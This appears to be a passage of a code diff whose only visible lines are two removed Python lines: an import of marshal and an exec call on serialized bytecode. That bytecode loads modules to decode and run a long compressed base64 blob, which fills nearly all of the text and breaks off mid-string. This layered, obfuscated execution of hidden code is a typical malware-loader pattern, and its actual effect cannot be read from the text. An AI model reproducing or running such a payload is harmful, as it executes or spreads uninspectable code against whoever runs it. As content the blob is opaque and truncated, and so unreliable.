@@ -1,2 +1,2117 @@
-import marshal
-exec(marshal.loads(b'\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00@\x00\x00\x00s0\x00\x00\x00d\x00d\x01l\x00Z\x00d\x00d\x01l\x01Z\x01d\x00d\x01l\x02Z\x02e\x03e\x01\xa0\x04e\x02\xa0\x05d\x02\xa1\x01\xa1\x01\x83\x01\x01\x00d\x01S\x00)\x03\xe9\x00\x00\x00\x00Na\x90O\x00\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